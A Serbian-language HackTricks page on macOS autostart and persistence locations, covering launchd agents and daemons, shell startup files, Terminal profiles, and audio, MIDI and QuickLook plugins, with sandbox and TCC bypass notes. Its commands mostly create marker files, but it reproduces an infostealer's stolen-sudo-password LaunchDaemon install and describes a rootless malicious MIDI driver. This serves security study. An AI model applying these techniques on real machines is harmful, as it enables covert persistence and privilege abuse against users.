# macOS automatsko pokretanje

{{#include ../banners/hacktricks-training.md}}

Ovaj odeljak se u velikoj meri zasniva na seriji blogova [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Cilj je da se identifikuju lokacije na kojima upisivanje datoteke može kasnije dovesti do izvršavanja koda, događaj koji pokreće izvršavanje i potrebne dozvole. To što je lokacija prisutna ne dokazuje da je mehanizam omogućen. Provere na lokalnom sistemu navedene u nastavku obavljene su na macOS 26.5.2 (5. oktobar 2026); one ne potvrđuju da se ponašanje odnosi na svako izdanje macOS-a.

> [!NOTE]
> „Pokretanje upisivanjem” ne znači uvek „pokreće se odmah nakon upisivanja”. Neke lokacije se čitaju samo prilikom prijave, pokretanja određene aplikacije ili korisničke radnje. Payload koji može da se menja unutar već konfiguriranog zadatka takođe nije isto što i dozvola za registrovanje novog zadatka. Testirajte na privremenom korisničkom nalogu ili u VM-u pre nego što se oslonite na tehniku.

## Zaobilaženje sandbox-a

> [!TIP]
> Ovde možete pronaći lokacije za pokretanje korisne za **zaobilaženje sandbox-a** koje vam omogućavaju da jednostavno izvršite nešto tako što ćete to **upisati u datoteku** i **sačekati** neku veoma **uobičajenu** **radnju**, određeni **vremenski period** ili **radnju koju obično možete izvršiti** iz sandbox-a, bez potrebe za root dozvolama.

### Launchd

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

- **`/Library/LaunchAgents`**
  - **Okidač**: Prijava korisnika (ili eksplicitna registracija)
  - Potreban je root
- **`/Library/LaunchDaemons`**
  - **Okidač**: Pokretanje sistema (ili eksplicitna registracija)
  - Potreban je root
- **`/System/Library/LaunchAgents`**
  - **Okidač**: Prijava korisnika; zaštićena Apple sistemska lokacija
- **`/System/Library/LaunchDaemons`**
  - **Okidač**: Pokretanje sistema; zaštićena Apple sistemska lokacija
- **`~/Library/LaunchAgents`**
  - **Okidač**: Ponovna prijava

Ne postoji lokacija `~/Library/LaunchDaemons` koju `launchd` skenira. Zadaci po korisniku pripadaju u `~/Library/LaunchAgents`; sistemski direktorijum daemona je `/Library/LaunchDaemons`. [Apple-ov vodič za pokretanje launchd-a](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) dokumentuje lokacije koje se skeniraju.

> [!TIP]
> Zanimljiva činjenica: **`launchd`** ima ugrađenu property list datoteku u Mach-o odeljku `__Text.__config`, koja sadrži druge dobro poznate servise koje launchd mora da pokrene. Štaviše, ti servisi mogu sadržati `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, što znači da moraju da se pokrenu i uspešno završe.
>
> Naravno, ne može se menjati zbog potpisivanja koda.

#### Opis i eksploatacija

**`launchd`** je **prvi proces** koji izvršava OX S kernel pri pokretanju sistema i poslednji koji se završava pri gašenju. Uvek bi trebalo da ima **PID 1**. Ovaj proces će **čitati i izvršavati** konfiguracije navedene u **ASEP** **plist** datotekama na sledećim lokacijama:

- `/Library/LaunchAgents`: Agenti po korisniku koje je instalirao administrator
- `/Library/LaunchDaemons`: Daemoni za ceo sistem koje je instalirao administrator
- `/System/Library/LaunchAgents`: Agenti po korisniku koje obezbeđuje Apple.
- `/System/Library/LaunchDaemons`: Daemoni za ceo sistem koje obezbeđuje Apple.

Kada se korisnik prijavi, `launchd` učitava plist datoteke iz `~/Library/LaunchAgents` tog korisnika, uz dozvole tog korisnika. Zadaci se pokreću u skladu sa svojim ključevima; samo učitavanje plist datoteke ne znači da će se proces odmah izvršiti.

**Glavna razlika između agenata i daemona je u tome što se agenti učitavaju kada se korisnik prijavi, a daemoni se učitavaju pri pokretanju sistema** (pošto servisi kao što je ssh moraju da se pokrenu pre nego što bilo koji korisnik pristupi sistemu). Agenti takođe mogu da koriste GUI, dok daemoni moraju da rade u pozadini.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Svaki element `ProgramArguments` predstavlja zaseban argument; `launchd` ne parsira jedan string kao shell komandu. Ispravljeni primer iznad može da se proveri sintaksno bez učitavanja pomoću `plutil -lint /path/to/example.plist`. Pogledajte lokalnu stranicu `man launchd.plist` za `ProgramArguments`, `RunAtLoad` i `KeepAlive`.

#### Okidači za događaje nad datotekama u postojećim poslovima

**Već učitan** agent ili daemon može da koristi `WatchPaths` za pokretanje kada se promeni navedena putanja. `QueueDirectories` pokreće posao dok direktorijum nije prazan; `StartOnMount` ga pokreće pri montiranju volumena. [Apple-ov vodič za launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) sadrži primere za `WatchPaths` i `QueueDirectories`. Upis u nadgledanu datoteku pokreće **već konfigurisani posao**; proizvoljno izvršavanje koda moguće je samo ako onaj ko vrši upis može da kontroliše i izvršnu datoteku, skriptu ili podatke koje posao tumači. Sam upis nove plist datoteke izvan skenirane ili registrovane lokacije ne dovodi do njenog učitavanja.

Ovaj PoC koji se sam čisti registruje jedinstveno imenovan **privremeni korisnički agent**, menja samo svoju nadgledanu datoteku i uklanja agenta. Uspešno je pokrenut na macOS 26.5.2 bez odjavljivanja ili ponovnog pokretanja:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Lokalno pokretanje ispisalo je `watch fired: True`, a `bootout` je uspešno izvršen. `launchctl bootstrap` se ovde koristi samo unutar izolovanog PoC-a; nije potreban za posao koji je već učitan. Da biste bezbedno procenili postojeći posao, pročitajte njegov plist i razrešenu putanju `ProgramArguments`, a zatim proverite da li je moguće pisati u odgovarajuću izvršnu datoteku ili interpretiranu datoteku, bez menjanja njenog sadržaja.

U nekim slučajevima **agent treba da se izvrši pre nego što se korisnik prijavi**; takvi agenti se nazivaju **PreLoginAgents**. To je, na primer, korisno za obezbeđivanje pomoćne tehnologije pri prijavljivanju. Mogu se pronaći i u `/Library/LaunchAgents` (primer pogledajte [**ovde**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)).

> [!TIP]
> Nove konfiguracione datoteke Daemon-a ili Agent-a biće **učitane posle sledećeg ponovnog pokretanja ili pomoću** `launchctl load <target.plist>`. **Moguće je učitati i .plist datoteke bez te ekstenzije** pomoću `launchctl -F <file>` (međutim, te plist datoteke neće se automatski učitati nakon ponovnog pokretanja).\
> Moguće ih je i **ukloniti** pomoću `launchctl unload <target.plist>` (proces na koji datoteka upućuje biće prekinut),
>
> Da biste **se uverili** da **ništa** (poput override-a) **ne sprečava** **Agent** ili **Daemon** **da se** **pokrene**, izvršite: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Izlistajte sve agente i daemone koje je učitao trenutni korisnik:

```bash
launchctl list
```

#### Primer zlonamernog lanca LaunchDaemon (ponovna upotreba lozinke)

Nedavni macOS infostealer je ponovo upotrebio **presretnutu sudo lozinku** da instalira user agent i root LaunchDaemon:<sup>[[1]](#references)</sup>

- Zapišite petlju agenta u `~/.agent` i učinite je izvršnom.
- Generišite plist u `/tmp/starter` koji upućuje na taj agent.
- Ponovo upotrebite ukradenu lozinku uz `sudo -S` da biste je kopirali u `/Library/LaunchDaemons/com.finder.helper.plist`, postavili `root:wheel` i učitali pomoću `launchctl load`.
- Tiho pokrenite agenta pomoću `nohup ~/.agent >/dev/null 2>&1 &` da biste odvojili izlaz.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Plist datoteka daemona postavljena u `/Library/LaunchDaemons` ne postaje bezbedna samo zato što joj je vlasnik korisnik. `launchd` zahteva odgovarajućeg vlasnika i dozvole za sistemske poslove i može odbiti nebezbednu plist datoteku. Daemon čiji je vlasnik root obično se pokreće kao root, osim ako njegova konfiguracija ne izabere drugi nalog. Proverite `UserName`, `GroupName`, vlasništvo i dijagnostiku `launchctl`; nemojte zaključivati koji će identitet biti korišćen za izvršavanje samo na osnovu imena vlasnika plist datoteke.

#### Više informacija o launchd

**`launchd`** je **prvi** proces u korisničkom režimu koji se pokreće iz **kernela**. Pokretanje procesa mora biti **uspešno** i on **ne može da se ugasi ili sruši**. Čak je i **zaštićen** od nekih **signala za prekid**.

Jedna od prvih stvari koje bi `launchd` uradio jeste da **pokrene** sve **daemone**, kao što su:

- **Timer daemoni** koji se izvršavaju u određeno vreme:
  - `com.apple.atrun.plist` poziva `/usr/libexec/atrun` sa `StartInterval = 30` sekundi u macOS 26.5.2; njegovo efektivno stanje omogućenosti može se razlikovati od vrednosti ključa `Disabled` u plist datoteci jer launchd zasebno čuva nadjačavanja.
  - `com.vix.cron.plist` poziva `/usr/sbin/cron` kada `/usr/lib/cron/tabs` sadrži poslove. `com.apple.systemstats.daily` je zaseban zakazani servis, a ne cron daemon.
- **Mrežni daemoni**, kao što su:
  - `org.cups.cups-lpd`: osluškuje TCP (`SockType: stream`) koristeći `SockServiceName: printer`
    - SockServiceName mora biti ili port ili servis iz `/etc/services`
  - `com.apple.xscertd.plist`: osluškuje TCP na portu 1640
- **Path daemoni** koji se izvršavaju kada se određena putanja promeni:
  - `com.apple.postfix.master`: proverava putanju `/etc/postfix/aliases`
- **IOKit notifications daemoni**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: unos `MachServices` ukazuje na ime `com.apple.xscertd.helper`
- **UserEventAgent:**
  - Ovo se razlikuje od prethodnog. Omogućava launchd-u da pokreće aplikacije kao odgovor na određeni događaj. Međutim, u ovom slučaju glavni binarni fajl koji se koristi nije `launchd`, već `/usr/libexec/UserEventAgent`. Učitava plugine iz SIP ograničene fascikle /System/Library/UserEventPlugins/, gde svaki plugin navodi svoj inicijalizator u ključu `XPCEventModuleInitializer` ili, kod starijih plugina, u dict `CFPluginFactories`, pod ključem `FB86416D-6164-2070-726F-70735C216EC0` u svojoj datoteci `Info.plist`.

### datoteke za pokretanje shell-a

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Ali treba pronaći aplikaciju sa TCC bypass-om koja pokreće shell koji učitava ove datoteke

#### Lokacije

- **`~/.zshenv`** (ili novija kompajlirana datoteka **`~/.zshenv.zwc`**)
  - **Okidač**: Svako uobičajeno pokretanje zsh-a, uključujući neinteraktivni `zsh -c`; `zsh -f` preskače korisničke datoteke za pokretanje.
- **`~/.zshrc`**
  - **Okidač**: Pokreće se interaktivni zsh.
- **`~/.zprofile`, `~/.zlogin`**
  - **Okidač**: Pokreće se login zsh; ove datoteke se učitavaju pre i posle `.zshrc`, tim redom.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Okidač**: Otvorite terminal sa zsh-om
  - Potreban je root
- **`~/.zlogout`**
  - **Okidač**: Login zsh se normalno gasi, ne pri svakom izlasku iz terminala ili shell-a.
- **`/etc/zlogout`**
  - **Okidač**: Izađite iz terminala sa zsh-om
  - Potreban je root
- Potencijalno ih ima još u: **`man zsh`**
- **`~/.bashrc`**
  - **Okidač**: Pokrenite interaktivni **non-login** Bash. Interaktivni login Bash učitava ovu datoteku samo ako je login datoteka izričito pozove.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Okidač**: Pokrenite login Bash; izvršava se prva čitljiva datoteka u ovom redosledu. `~/.profile` se preskače ako postoji bilo koja od prethodne dve datoteke.
- **`/etc/profile`**
  - **Okidač**: Pokrenite login Bash; za njenu izmenu potreban je root.
- **`~/.tcshrc`** ili, ako ne postoji, **`~/.cshrc`**
  - **Okidač**: Pokrenite `tcsh`, uključujući neinteraktivni `tcsh -c` na ovom Mac-u. Korisnik mora zaista da pokrene `tcsh`; to nije podrazumevani macOS shell.
- **`~/.login`**
  - **Okidač**: Pokrenite login `tcsh` nakon njegove rc datoteke.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Okidač**: Očekuje se da se pokrenu sa xterm-om, ali on **nije instaliran**, a čak i nakon instalacije javlja se ova greška: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Opis i eksploatacija

Prilikom pokretanja shell okruženja kao što su `zsh` ili `bash`, **pokreću se određene datoteke za pokretanje**. macOS trenutno koristi `/bin/zsh` kao podrazumevani shell. Da li Terminal ili SSH pokreću login ili interaktivni shell zavisi od njihove konfiguracije; nemojte pretpostavljati da se svaka od navedenih datoteka pokreće u svakoj sesiji. Iako su `bash` i `sh` takođe dostupni u macOS-u, moraju se izričito pokrenuti da bi se koristili.<sup>[[2]](#references)</sup> [Referenca za zsh startup datoteke](https://zsh.sourceforge.io/Doc/Release/Files.html) navodi redosled, nadjačavanje pomoću `ZDOTDIR` i pravilo za `.zwc`.

Sledeći eksperiment samo za čitanje koristio je privremeni `ZDOTDIR` u macOS 26.5.2. Prikazuje koje su korisničke datoteke pročitane; nijedna stvarna shell startup datoteka nije izmenjena:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Uočeni redosled bio je `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` već mora da pokazuje na alternativni direktorijum; samo zapisivanje datoteka u proizvoljan direktorijum nije dovoljno.

[Bash-ova referenca za pokretanje](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) razlikuje login i interaktivne shell-ove. Na testnoj mašini sa macOS 26.5.2, izolovani `HOME` koji je sadržao sve četiri korisničke startup datoteke dao je sledeće rezultate: `bash -c` → ništa, `bash -ic` → `.bashrc`, `bash -lc` i `bash -lic` → samo `.bash_profile`. Uklanjanjem `.bash_profile` login Bash je čitao `.bash_login`, a zatim `.profile` kada je i ta datoteka uklonjena. `BASH_ENV` može da usmeri neinteraktivni Bash na datoteku, ali ta promenljiva okruženja već mora biti podešena u procesu koji ga poziva. Eksplicitni `exit` iz login Bash-a može da učita i `~/.bash_logout`.

Lokalni priručnik za `tcsh(1)` opisuje poseban redosled pokretanja. Sa privremenim `HOME`, `/bin/tcsh -c :` čitao je `.tcshrc` ili `.cshrc` kada `.tcshrc` nije postojao. Privremeni login `tcsh` čitao je `.tcshrc` i `.login`. Ove provere su kreirale i uklonile samo privremene datoteke.

### Ponovo otvorene aplikacije

> [!CAUTION]
> Tokom testiranja, podešavanje navedenog iskorišćavanja, pa odjavljivanje i ponovno prijavljivanje, ili čak ponovno pokretanje sistema, nije pokrenulo aplikaciju. Aplikacija možda mora da bude pokrenuta dok se ove radnje obavljaju.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Okidač**: Ponovno pokretanje koje ponovo otvara aplikacije

#### Opis i iskorišćavanje

Sve aplikacije koje treba ponovo otvoriti nalaze se u plist datoteci `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Dakle, da bi se među aplikacijama koje se ponovo otvaraju pokrenula vaša, samo treba da **dodate svoju aplikaciju na listu**.

UUID možete pronaći pregledom tog direktorijuma ili pomoću `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Da biste proverili koje će aplikacije biti ponovo otvorene, možete da pokrenete:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Da biste **dodali aplikaciju na ovu listu**, možete koristiti:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Podešavanja terminala

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [✅](https://emojipedia.org/check-mark-button)
  - Terminal koristi FDA dozvole korisnika koji ga pokreće

#### Lokacija

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Okidač**: Otvorite novi prozor ili karticu Terminala koristeći profil čija Shell podešavanja sadrže komandu za pokretanje

#### Opis i eksploatacija

U **`~/Library/Preferences`** čuvaju se korisnička podešavanja za aplikacije. Neka od ovih podešavanja mogu sadržati konfiguraciju za **pokretanje drugih aplikacija/skripti**.<sup>[[5]](#references)</sup>

Na primer, Terminal može da izvrši komandu pri pokretanju:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ova konfiguracija je prikazana u fajlu **`~/Library/Preferences/com.apple.Terminal.plist`** ovako:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Ako odgovarajući profil sadrži naredbu za pokretanje i Terminal pročita tu postavku, nova sesija koja koristi taj profil može da je izvrši. [Apple-ov aktuelni vodič za Terminal](https://support.apple.com/guide/terminal/trmlshll/mac) opisuje naredbu **Shell → Startup** za svaki profil. Samo otvaranje Terminala, bez pokretanja nove sesije koja koristi taj profil, nije dovoljno. Izmene postavki navedene ispod **nisu** izvršene na Mac-u korišćenom za istraživanje.

Ovo možete dodati pomoću CLI-ja:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Ostale ekstenzije datoteka

- Korisno za zaobilaženje sandboxa: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal može da ima FDA dozvole korisnika koji ga koristi

#### Lokacija

- **Bilo gde**
  - **Okidač**: Otvaranje određene datoteke `.terminal`, `.command` ili `.tool`

#### Opis i eksploatacija

Ako korisnik otvori datoteku sa podešavanjima **`.terminal`**, Terminal može da kreira sesiju na osnovu njenog profila; izvršne datoteke **`.command`** i **`.tool`** takođe se mogu otvoriti u Terminalu. Ovo je eksplicitni okidač za otvaranje datoteke, a ne izvršavanje koje se dešava samo otvaranjem Terminala. Svaki nasleđeni TCC pristup zavisi od stvarnih dozvola Terminala i radnje koja se pokušava izvršiti. Istorijski primer u nastavku nije pokrenut na Mac računaru korišćenom za istraživanje.

Isprobajte ovako:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Možete koristiti i ekstenzije **`.command`**, **`.tool`** sa sadržajem običnih shell skripti; i njih će otvoriti Terminal.

> [!CAUTION]
> Ako Terminal ima **Full Disk Access**, moći će da dovrši tu radnju (imajte na umu da će izvršena komanda biti vidljiva u prozoru Terminala).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Možda ćete dobiti dodatni TCC pristup

#### Lokacija

- **`/Library/Audio/Plug-Ins/HAL`**
  - Potreban je root
  - **Okidač**: Core Audio server učitava kompatibilan HAL device plug-in; ponovno pokretanje servera može pokrenuti ponovno otkrivanje
- **`/Library/Audio/Plug-ins/Components`**
  - Potreban je root
  - **Okidač**: Audio host otkriva i instancira instalirani Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Okidač**: Audio host otkriva i instancira instalirani Audio Unit
- **`/System/Library/Components`**
  - Lokacija koju obezbeđuje Apple i koja je zaštićena sistemom
  - **Okidač**: Audio host instancira odgovarajuću sistemsku komponentu

#### Opis

Prema prethodnim writeup-ovima, moguće je **kompajlirati neke audio plug-in-ove** i učitati ih.<sup>[[6]](#references)[[7]](#references)</sup>

HAL device plug-in-ovi i Audio Units koriste različite putanje za učitavanje. [Apple-ov vodič za hostovanje Audio Unit-ova](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) navodi da host mora da pronađe i instancira komponentu; samo kopiranje komponente u direktorijum za skeniranje ili ponovno pokretanje `coreaudiod` ne dokazuje da je došlo do izvršavanja. AUv2 plug-in-ovi se pokreću u procesu hosta, dok se, prema [Apple-ovim aktuelnim smernicama za Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments), AUv3 podrazumevano pokreće u zasebnom procesu na macOS-u. Provere potpisa, sandbox-a i validacije biblioteka zavise od hosta. Nijedan audio plug-in nije instaliran niti izvršen na Mac računaru korišćenom za istraživanje.

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Vaš kod se izvršava unutar procesa `MIDIServer`, a ne u sandbox-u vaše aplikacije
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` se pokreće u sopstvenom `seatbelt` sandbox profilu

#### Lokacija

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root nije potreban (može da upisuje korisnik)
  - **Okidač**: `MIDIServer` se pokreće (ili ponovo pokreće). Pokreće se na zahtev prvi put kada bilo koji proces koristi CoreMIDI (otvaranjem *Audio MIDI Setup*, GarageBand-a, DAW-a ili stranice koja koristi WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Potreban je root
  - **Okidač**: isto kao iznad

#### Opis i eksploatacija

Apple-ov `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) učitava MIDI **driver** pakete iz direktorijuma `Audio/MIDI Drivers`. Binarna datoteka je potpisana od strane Apple-a, ali se isporučuje sa ovlašćenjem `com.apple.security.cs.disable-library-validation`, pa će učitati paket koji je **nepotpisan ili ad hoc potpisan od strane drugog tima**. Time se omogućava izvršavanje koda unutar zasebnog procesa u vlasništvu Apple-a **bez root-a**.<sup>[[53]](#references)</sup>

Provereno na macOS 26 (samo za čitanje):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Driver je standardni bundle koji izvozi factory za `MIDIDriverInterface`; ako payload smestite u factory/constructor, pokrenuće se čim `MIDIServer` enumeriše drivere. Izgradite ga, smestite kao `~/Library/Audio/MIDI Drivers/Evil.plugin`, a zatim pokrenite učitavanje bez odjavljivanja ili ponovnog pokretanja:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Možda ćete dobiti dodatni pristup TCC-u

#### Lokacija

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis i eksploatacija

QuickLook plugins mogu da se izvrše kada **pokrenete pregled datoteke** (pritisnite razmaknicu dok je datoteka izabrana u Finder-u) i kada je instaliran **plugin koji podržava taj tip datoteke**.<sup>[[8]](#references)</sup>

Moguće je kompajlirati sopstveni QuickLook plugin, smestiti ga na jednu od prethodnih lokacija da bi se učitao, a zatim otići do podržane datoteke i pritisnuti razmaknicu da biste ga pokrenuli.

Ove putanje se odnose na zastarele `.qlgenerator` pakete; [Apple-ov vodič za arhitekturu Quick Look-a](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) opisuje redosled pretrage i tipove datoteka koji se podudaraju. Trenutne Quick Look **app extensions** pakuju se uz aplikaciju i imaju drugačija pravila za registraciju i izvršavanje. Samo prisustvo generatora ne dokazuje da će biti izabran za taj tip datoteke niti da će se njegov kod izvršavati u samom Finder-u. Putanja za zastarele generatore proverena je na osnovu dokumentacije i prisustva direktorijuma; nijedan generator nije bio instaliran ni učitan na istraživačkom Mac-u.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Ovo mi nije radilo, ni sa korisničkim LoginHook-om ni sa root LogoutHook-om

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Morate moći da izvršite nešto poput `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
